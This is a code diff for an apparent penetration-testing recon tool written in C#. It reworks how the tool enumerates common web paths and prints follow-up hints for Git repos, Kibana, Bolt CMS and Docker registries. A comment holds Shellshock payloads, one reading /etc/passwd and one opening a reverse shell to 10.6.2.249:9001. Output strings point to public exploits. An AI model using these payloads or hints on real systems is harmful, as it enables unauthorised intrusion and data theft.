@@ -218,6 +218,7 @@ namespace Reecon
 
             // Wildcard test
             int notFoundLength = -1;
+            int ignoreFileLength = -1;
             int ignoreFolderLength = -1;
             string wildcardURL = url + "be0df04b-f5ff-4b4f-af99-00968cf08fed";
             bool ignoreRedirect = false;
@@ -229,7 +230,7 @@ namespace Reecon
             string pageResultText = pageResult.PageText;
             if (pageResult.StatusCode == HttpStatusCode.OK)
             {
-                notFoundLength = pageResultText.Length;
+                ignoreFileLength = pageResultText.Length;
                 returnText += $"- Wildcard paths such as {wildcardURL} return - This may cause issues..." + Environment.NewLine;
             }
             else if (pageResult.StatusCode == HttpStatusCode.Redirect || pageResult.StatusCode == HttpStatusCode.Moved)
@@ -291,6 +292,7 @@ namespace Reecon
                 "hidden/",
                 "secret/",
                 "backup/",
+                "backups/",
                 // Common Index files
                 "index.php",
                 "index.html",
@@ -327,8 +329,8 @@ namespace Reecon
                 "bolt-public/img/bolt-logo.png",
                 // Shellshock
                 "cgi-bin/", // Test: curl -H "User-Agent: () { :;}; echo; /bin/cat /etc/passwd;" http://1.2.3.4/cgi-bin/valid.cgi
-                           // Shell: curl -H "User-Agent: () { :;}; echo; /bin/bash -i >& /dev/tcp/10.6.2.249/9001 0>&1;" http://10.10.175.194/cgi-bin/valid.cgi
-                // Well-Known
+                            // Shell: curl -H "User-Agent: () { :;}; echo; /bin/bash -i >& /dev/tcp/10.6.2.249/9001 0>&1;" http://10.10.175.194/cgi-bin/valid.cgi
+                            // Well-Known
                 ".well-known/", // https://www.google.com/.well-known/security.txt
                 // Docker
                 "version"
@@ -342,267 +344,235 @@ namespace Reecon
             {
                 // Console.WriteLine("In Enum: " + file);
                 string path = url + file;
-                try
+                var response = Web.GetHTTPInfo(path);
+                if (response.StatusCode == HttpStatusCode.OK)
                 {
-                    var response = Web.GetHTTPInfo(path);
-                    if (response.StatusCode == HttpStatusCode.OK)
+                    // Since it's readable - Let's deal with it!
+                    try
                     {
-                        // Since it's readable - Let's deal with it!
-                        try
+                        string pageText = response.PageText;
+                        // Ack
+                        if (pageText.Length != notFoundLength && // Index files?
+                            pageText.Length != ignoreFileLength &&
+                            (!file.EndsWith("/") || (pageText.Length != ignoreFolderLength)))
                         {
-                            string pageText = response.PageText;
-                            if (pageText.Length != notFoundLength && (!file.EndsWith("/") || (pageText.Length != ignoreFolderLength)))
+                            returnText += "- " + $"Common Path is readable: {url}{file} (Len: {pageText.Length})".Pastel(Color.Orange) + Environment.NewLine;
+                            // Specific case for robots.txt since it's common and extra useful
+                            if (file == "robots.txt")
                             {
-                                returnText += "- " + $"Common Path is readable: {url}{file} (Len: {pageText.Length})".Pastel(Color.Orange) + Environment.NewLine;
-                                // Specific case for robots.txt since it's common and extra useful
-                                if (file == "robots.txt")
+                                foreach (var line in pageText.Split(Environment.NewLine.ToCharArray()))
                                 {
-                                    foreach (var line in pageText.Split(Environment.NewLine.ToCharArray()))
+                                    if (line != "")
                                     {
-                                        if (line != "")
-                                        {
-                                            returnText += "-- " + line + Environment.NewLine;
-                                        }
+                                        returnText += "-- " + line + Environment.NewLine;
                                     }
                                 }
-                                // Bolt
-                                else if (file == "bolt-public/img/bolt-logo.png")
-                                {
-                                    returnText += "-- Bolt CMS!".Pastel(Color.Orange) + Environment.NewLine;
-                                    returnText += $"-- Admin Page: {url}bolt" + Environment.NewLine;
-                                    returnText += "-- If you get details and the version is 3.6.* or 3.7: https://www.rapid7.com/db/modules/exploit/unix/webapp/bolt_authenticated_rce OR https://github.com/r3m0t3nu11/Boltcms-Auth-rce-py/blob/master/exploit.py (3.7.0)" + Environment.NewLine;
-                                }
-                                // Docker Engine
-                                else if (file == "version" && pageText.Contains("Docker Engine - Community"))
-                                {
-                                    returnText += "-- Docker Engine Found!".Pastel(Color.Orange) + Environment.NewLine;
-                                    returnText += $"--- Run: docker -H tcp://iphere:portHere ps" + Environment.NewLine;
-                                }
-                                // Git repo!
-                                else if (file == ".git/HEAD")
-                                {
-                                    returnText += "-- Git repo found!" + Environment.NewLine;
+                            }
+                            // Bolt
+                            else if (file == "bolt-public/img/bolt-logo.png")
+                            {
+                                returnText += "-- Bolt CMS!".Pastel(Color.Orange) + Environment.NewLine;
+                                returnText += $"-- Admin Page: {url}bolt" + Environment.NewLine;
+                                returnText += "-- If you get details and the version is 3.6.* or 3.7: https://www.rapid7.com/db/modules/exploit/unix/webapp/bolt_authenticated_rce OR https://github.com/r3m0t3nu11/Boltcms-Auth-rce-py/blob/master/exploit.py (3.7.0)" + Environment.NewLine;
+                            }
+                            // Docker Engine
+                            else if (file == "version" && pageText.Contains("Docker Engine - Community"))
+                            {
+                                returnText += "-- Docker Engine Found!".Pastel(Color.Orange) + Environment.NewLine;
+                                returnText += $"--- Run: docker -H tcp://iphere:portHere ps" + Environment.NewLine;
+                            }
+                            // Git repo!
+                            else if (file == ".git/HEAD")
+                            {
+                                returnText += "-- Git repo found!" + Environment.NewLine;
 
-                                    // https://github.com/arthaud/git-dumper/issues/9
+                                // https://github.com/arthaud/git-dumper/issues/9
+                                WebClient wc = new();
+                                try
+                                {
+                                    if (wc.DownloadString($"{url}.git/").Contains("../"))
+                                    {
+                                        // -q: Quiet (So the console doesn't get spammed)
+                                        // -r: Download everything
+                                        // -np: But don't go all the way backwards
+                                        // -nH: So you only have the ".git" folder and not the IP folder as well
+                                        returnText += $"--- Download the repo: wget -q -r -np -nH {url}.git/" + Environment.NewLine;
+                                        returnText += "--- Get the logs: git log --pretty=format:\"%h - %an (%ae): %s %b\"" + Environment.NewLine;
+                                        // git log --pretty=format:"%h - %an (%ae): %s %b"
+                                        returnText += "--- Show a specific commit: git show 2eb93ac (Press q to close)" + Environment.NewLine;
+                                        continue;
+                                    }
+                                }
+                                catch { }
+                                returnText += "--- Download: https://raw.githubusercontent.com/arthaud/git-dumper/master/git_dumper.py" + Environment.NewLine;
+                                returnText += $"--- Run: python3 git_dumper.py {url}{file} .git" + Environment.NewLine;
+                                returnText += "--- Get the logs: git log --pretty=format:\"%h - %an (%ae): %s %b\"" + Environment.NewLine;
+                                returnText += "--- Show a specific commit: git show 2eb93ac (Press q to close)" + Environment.NewLine;
+                            }
+                            // Kibana!
+                            else if (file == "app/kibana")
+                            {
+                                returnText += "-- Kibana!" + Environment.NewLine;
+                                try
+                                {
                                     WebClient wc = new();
-                                    try
+                                    string toCheck = $"{url}{file}";
+                                    string pageData = wc.DownloadString($"{url}{file}");
+                                    if (pageData.IndexOf("&quot;version&quot;:&quot;") != -1)
                                     {
-                                        if (wc.DownloadString($"{url}.git/").Contains("../"))
-                                        {
-                                            // -q: Quiet (So the console doesn't get spammed)
-                                            // -r: Download everything
-                                            // -np: But don't go all the way backwards
-                                            // -nH: So you only have the ".git" folder and not the IP folder as well
-                                            returnText += $"--- Download the repo: wget -q -r -np -nH {url}.git/" + Environment.NewLine;
-                                            returnText += "--- Get the logs: git log --pretty=format:\"%h - %an (%ae): %s %b\"" + Environment.NewLine;
-                                            // git log --pretty=format:"%h - %an (%ae): %s %b"
-                                            returnText += "--- Show a specific commit: git show 2eb93ac (Press q to close)" + Environment.NewLine;
-                                            continue;
-                                        }
-                                    }
-                                    catch { }
-                                    returnText += "--- Download: https://raw.githubusercontent.com/arthaud/git-dumper/master/git_dumper.py" + Environment.NewLine;
-                                    returnText += $"--- Run: python3 git_dumper.py {url}{file} .git" + Environment.NewLine;
-                                    returnText += "--- Get the logs: git log --pretty=format:\"%h - %an (%ae): %s %b\"" + Environment.NewLine;
-                                    returnText += "--- Show a specific commit: git show 2eb93ac (Press q to close)" + Environment.NewLine;
-                                }
-                                // Kibana!
-                                else if (file == "app/kibana")
-                                {
-                                    returnText += "-- Kibana!" + Environment.NewLine;
-                                    try
-                                    {
-                                        WebClient wc = new();
-                                        string toCheck = $"{url}{file}";
-                                        string pageData = wc.DownloadString($"{url}{file}");
-                                        if (pageData.IndexOf("&quot;version&quot;:&quot;") != -1)
-                                        {
-                                            string versionText = pageData.Remove(0, pageData.IndexOf("&quot;version&quot;:&quot;") + 26);
-                                            versionText = versionText.Substring(0, versionText.IndexOf("&quot;"));
-                                            returnText += "--- Version: " + versionText + Environment.NewLine;
-                                            returnText += "---- Kibana versions before 5.6.15 and 6.6.1 -> CVE-2019-7609 -> https://github.com/mpgn/CVE-2019-7609" + Environment.NewLine;
-                                        }
-                                        else
-                                        {
-                                            returnText += $"--- Version: {url}{file}#/management/" + Environment.NewLine;
-                                        }
-                                    }
-                                    catch
-                                    {
-                                        returnText += $"--- Version: {url}{file}#/management/" + Environment.NewLine;
-                                    }
-                                    returnText += $"--- Elasticsearch Console: {url}{file}#/dev_tools/console" + Environment.NewLine;
-                                    returnText += "---- General Info: GET /" + Environment.NewLine;
-                                    returnText += "---- Get Indices: GET /_cat/indices?v" + Environment.NewLine;
-                                    // These aren't meant to be params
-                                    returnText += "---- Get Index Info: GET /{index}/_search/?pretty&size={docs.count}" + Environment.NewLine;
-                                }
-                                else
-                                {
-                                    if (response.PageTitle.StartsWith("Index of /"))
-                                    {
-                                        returnText += "-- " + "Open directory listing".Pastel(Color.Orange) + Environment.NewLine;
+                                        string versionText = pageData.Remove(0, pageData.IndexOf("&quot;version&quot;:&quot;") + 26);
+                                        versionText = versionText.Substring(0, versionText.IndexOf("&quot;"));
+                                        returnText += "--- Version: " + versionText + Environment.NewLine;
+                                        returnText += "---- Kibana versions before 5.6.15 and 6.6.1 -> CVE-2019-7609 -> https://github.com/mpgn/CVE-2019-7609" + Environment.NewLine;
                                     }
                                     else
                                     {
-                                        string usefulInfo = Web.FindInfo(pageText, true);
-                                        if (usefulInfo.Trim(Environment.NewLine.ToCharArray()) != "")
-                                        {
-                                            returnText += usefulInfo + Environment.NewLine;
-                                        }
+                                        returnText += $"--- Version: {url}{file}#/management/" + Environment.NewLine;
                                     }
-                                }
-                            }
-
-                        }
-                        catch (Exception ex)
-                        {
-                            Console.WriteLine("Bug Reelix - HTTP.FindCommonFiles Error: " + ex.Message + Environment.NewLine);
-                        }
-                    }
-                    else if (response.StatusCode == HttpStatusCode.BadRequest)
-                    {
-                        // Bad Request is still useful - Unless we're ignoring it
-                        if (!ignoreBadRequest)
-                        {
-                            returnText += $"- Common Path is a Bad Request: {url}{file}" + Environment.NewLine;
-                        }
-                    }
-                    else if (response.StatusCode == HttpStatusCode.Forbidden)
-                    {
-                        // Forbidden is still useful - Unless we're ignoring it
-                        if (!ignoreForbidden)
-                        {
-                            returnText += $"- Common Path is Forbidden: {url}{file}" + Environment.NewLine;
-                        }
-                    }
-                    else if (response.StatusCode == HttpStatusCode.Redirect || response.StatusCode == HttpStatusCode.Moved)
-                    {
-                        if (ignoreRedirect)
-                        {
-                            continue;
-                        }
-                        if (file.EndsWith(".php") && ignorePHPRedirect)
-                        {
-                            continue;
-                        }
-                        returnText += $"- Common Path redirects: {url}{file}" + Environment.NewLine;
-                        if (response.Headers != null && response.Headers.Get("Location") != null)
-                        {
-                            returnText += $"-- Redirection Location: {response.Headers.Get("Location")}" + Environment.NewLine;
-                        }
-                    }
-                    else if (response.StatusCode == HttpStatusCode.Unauthorized)
-                    {
-                        returnText += $"- Common path requires authentication: {url}{file}" + Environment.NewLine;
-                        var headers = response.Headers;
-                        if (headers.AllKeys.Any() && headers.Get("WWW-Authenticate") != null)
-                        {
-                            returnText += $"-- WWW-Authenticate: {headers.Get("WWW-Authenticate")}" + Environment.NewLine;
-                        }
-                        if (response.PageText != "")
-                        {
-                            returnText += $"-- Page Text: {response.PageText}" + Environment.NewLine;
-                        }
-                    }
-                    else if (response.StatusCode == 0)
-                    {
-                        returnText += $"- " + "Host timed out - Unable to enumerate".Pastel(Color.Red);
-                        break;
-                    }
-                    else if (response.StatusCode == HttpStatusCode.InternalServerError)
-                    {
-                        returnText += $"- Common path throws an Internal Server Error: {url}{file}" + Environment.NewLine;
-                    }
-                    else if (response.StatusCode == HttpStatusCode.NotFound && response.Headers.AllKeys.Contains("Docker-Distribution-Api-Version"))
-                    {
-                        string dockerVersion = response.Headers["Docker-Distribution-Api-Version"];
-                        returnText += "-- Docker Detected - API Version: " + dockerVersion + Environment.NewLine;
-                        if (dockerVersion == "registry/2.0")
-                        {
-                            WebClient wc = new();
-                            string repoText = wc.DownloadString($"{url}v2/_catalog");
-                            if (repoText.Contains("repositories"))
-                            {
-                                try
-                                {
-                                    var repoList = JsonDocument.Parse(repoText);
-                                    foreach (var item in repoList.RootElement.GetProperty("repositories").EnumerateArray())
-                                    {
-                                        returnText += "--- Repo Found: " + item  + Environment.NewLine;
-                                        string tagList = wc.DownloadString($"{url}v2/" + item + "/tags/list");
-                                        tagList = tagList.Replace("\r", "").Replace("\n", ""); // Sometimes has a built in newline for some reason
-                                        returnText += "---- Tags Found: " + tagList + Environment.NewLine;
-                                        // /v2/cmnatic/myapp1/tags/list
-                                        // --> /cmnatic/myapp1/manifests/notsecure
-                                    }
-                                    returnText += $"------> {url}v2/repo/app/manifests/tagnamehere";
-                                    // Every notfound will be the same
-                                    break;
                                 }
                                 catch
                                 {
-                                    returnText += "--- Unable to deserialize repo - Bug Reelix!" + Environment.NewLine;
-                                    break;
+                                    returnText += $"--- Version: {url}{file}#/management/" + Environment.NewLine;
                                 }
-                            }
-                            returnText += repoText;
-                        }
-                        else
-                        {
-                            returnText += "-- Unknown Docker API Version - Bug Reelix!";
-                        }
-                    }
-                    else if (response.StatusCode != HttpStatusCode.NotFound)
-                    {
-                        Console.WriteLine($"Unknown response for {file} - {response.StatusCode}");
-                    }
-                }
-                catch (WebException ex)
-                {
-                    if (ex.Response != null)
-                    {
-                        HttpWebResponse response = (HttpWebResponse)ex.Response;
-                        if (response.StatusCode == HttpStatusCode.OK)
-                        {
-                            returnText += $"- Common File exists: {url}{file}" + Environment.NewLine;
-                            string pageText = new StreamReader(response.GetResponseStream()).ReadToEnd();
-                            string usefulInfo = Web.FindInfo(pageText, true);
-                            if (usefulInfo.Trim(Environment.NewLine.ToCharArray()) != "")
-                            {
-                                returnText += usefulInfo + Environment.NewLine;
-                            }
-                        }
-                    }
-                    else
-                    {
-                        if (ex.Message.Trim().StartsWith("The remote name could not be resolved:"))
-                        {
-                            string message = ex.Message.Trim().Replace("The remote name could not be resolved:", "");
-                            returnText += "- Hostname Found: " + message.Trim().Trim('\'') + " - You need to do a manual common file check" + Environment.NewLine;
-                            return returnText;
-                        }
-                        else if (ex.Message == "The operation has timed out")
-                        {
-                            returnText += "- FindCommonFiles Timeout :<" + Environment.NewLine;
-                        }
-                        else
-                        {
-                            if (ex.Message != null)
-                            {
-                                Console.WriteLine("FindCommonFiles - Something weird happened: " + ex.Message);
+                                returnText += $"--- Elasticsearch Console: {url}{file}#/dev_tools/console" + Environment.NewLine;
+                                returnText += "---- General Info: GET /" + Environment.NewLine;
+                                returnText += "---- Get Indices: GET /_cat/indices?v" + Environment.NewLine;
+                                // These aren't meant to be params
+                                returnText += "---- Get Index Info: GET /{index}/_search/?pretty&size={docs.count}" + Environment.NewLine;
                             }
                             else
                             {
-                                Console.WriteLine("FindCommonFiles - Something REALLY weird happened - And it left no error message!");
+                                if (response.PageTitle.StartsWith("Index of /"))
+                                {
+                                    returnText += "-- " + "Open directory listing".Pastel(Color.Orange) + Environment.NewLine;
+                                }
+                                else
+                                {
+                                    string usefulInfo = Web.FindInfo(pageText, true);
+                                    if (usefulInfo.Trim(Environment.NewLine.ToCharArray()) != "")
+                                    {
+                                        returnText += usefulInfo + Environment.NewLine;
+                                    }
+                                }
                             }
-                            return returnText;
                         }
+
+                    }
+                    catch (Exception ex)
+                    {
+                        Console.WriteLine("Bug Reelix - HTTP.FindCommonFiles Error: " + ex.Message + Environment.NewLine);
                     }
                 }
-                catch (Exception ex)
+                else if (response.StatusCode == HttpStatusCode.BadRequest)
                 {
-                    Console.WriteLine("FindCommonFiles - Fatal Woof: " + ex.Message);
+                    // Bad Request is still useful - Unless we're ignoring it
+                    if (!ignoreBadRequest)
+                    {
+                        returnText += $"- Common Path is a Bad Request: {url}{file}" + Environment.NewLine;
+                    }
+                }
+                else if (response.StatusCode == HttpStatusCode.Forbidden)
+                {
+                    // Forbidden is still useful - Unless we're ignoring it
+                    if (!ignoreForbidden)
+                    {
+                        returnText += $"- Common Path is Forbidden: {url}{file}" + Environment.NewLine;
+                    }
+                }
+                else if (response.StatusCode == HttpStatusCode.Redirect || response.StatusCode == HttpStatusCode.Moved)
+                {
+                    if (ignoreRedirect)
+                    {
+                        continue;
+                    }
+                    if (file.EndsWith(".php") && ignorePHPRedirect)
+                    {
+                        continue;
+                    }
+                    returnText += $"- Common Path redirects: {url}{file}" + Environment.NewLine;
+                    if (response.Headers != null && response.Headers.Get("Location") != null)
+                    {
+                        returnText += $"-- Redirection Location: {response.Headers.Get("Location")}" + Environment.NewLine;
+                    }
+                }
+                else if (response.StatusCode == HttpStatusCode.Unauthorized)
+                {
+                    returnText += $"- Common path requires authentication: {url}{file}" + Environment.NewLine;
+                    var headers = response.Headers;
+                    if (headers.AllKeys.Any() && headers.Get("WWW-Authenticate") != null)
+                    {
+                        returnText += $"-- WWW-Authenticate: {headers.Get("WWW-Authenticate")}" + Environment.NewLine;
+                    }
+                    if (response.PageText != "")
+                    {
+                        returnText += $"-- Page Text: {response.PageText}" + Environment.NewLine;
+                    }
+                }
+                else if (response.StatusCode == 0)
+                {
+                    returnText += $"- " + "Host timed out - Unable to enumerate".Pastel(Color.Red);
+                    break;
+                }
+                else if (response.StatusCode == HttpStatusCode.InternalServerError)
+                {
+                    returnText += $"- Common path throws an Internal Server Error: {url}{file}" + Environment.NewLine;
+                }
+                else if (response.StatusCode == HttpStatusCode.NotFound && response.Headers.AllKeys.Contains("Docker-Distribution-Api-Version"))
+                {
+                    string dockerVersion = response.Headers["Docker-Distribution-Api-Version"];
+                    returnText += "-- Docker Detected - API Version: " + dockerVersion + Environment.NewLine;
+                    if (dockerVersion == "registry/2.0")
+                    {
+                        WebClient wc = new();
+                        string repoText = wc.DownloadString($"{url}v2/_catalog");
+                        if (repoText.Contains("repositories"))
+                        {
+                            try
+                            {
+                                var repoList = JsonDocument.Parse(repoText);
+                                foreach (var item in repoList.RootElement.GetProperty("repositories").EnumerateArray())
+                                {
+                                    returnText += "--- Repo Found: " + item + Environment.NewLine;
+                                    string tagList = wc.DownloadString($"{url}v2/" + item + "/tags/list");
+                                    tagList = tagList.Replace("\r", "").Replace("\n", ""); // Sometimes has a built in newline for some reason
+                                    returnText += "---- Tags Found: " + tagList + Environment.NewLine;
+                                    // /v2/cmnatic/myapp1/tags/list
+                                    // --> /cmnatic/myapp1/manifests/notsecure
+                                }
+                                returnText += $"------> {url}v2/repo/app/manifests/tagnamehere";
+                                // Every notfound will be the same
+                                break;
+                            }
+                            catch
+                            {
+                                returnText += "--- Unable to deserialize repo - Bug Reelix!" + Environment.NewLine;
+                                break;
+                            }
+                        }
+                        returnText += repoText;
+                    }
+                    else
+                    {
+                        returnText += "-- Unknown Docker API Version - Bug Reelix!";
+                    }
+                }
+                else if (response.StatusCode == HttpStatusCode.TemporaryRedirect)
+                {
+                    // Normally just http -> https
+                    var headers = response.Headers;
+                    if (url.StartsWith("http") && headers.AllKeys.Contains("Location") && (headers.Get("Location").StartsWith("https")))
+                    {
+                        continue;
+                    }
+                    else
+                    {
+                        // If it's not - Display it
+                        Console.WriteLine($"-- Weird TemporaryRedirect: {url}{file}" + Environment.NewLine);
+                    }
+                }
+                else if (response.StatusCode != HttpStatusCode.NotFound)
+                {
+                    Console.WriteLine($"Unknown response for {file} - {response.StatusCode}");
                 }
             }
             return returnText.Trim(Environment.NewLine.ToArray());
@@ -932,7 +902,7 @@ namespace Reecon
                     }
 
                     responseText += $"-- wpscan --url http://{DNS}/ --enumerate u1-5" + Environment.NewLine;
-                    
+
                     // Checking for wp-login.php
                     var wplogin = GetHTTPInfo($"{urlPrefix}://{DNS}/wp-login.php");
                     string wpLoginPath = "/blog/wp-login.php";
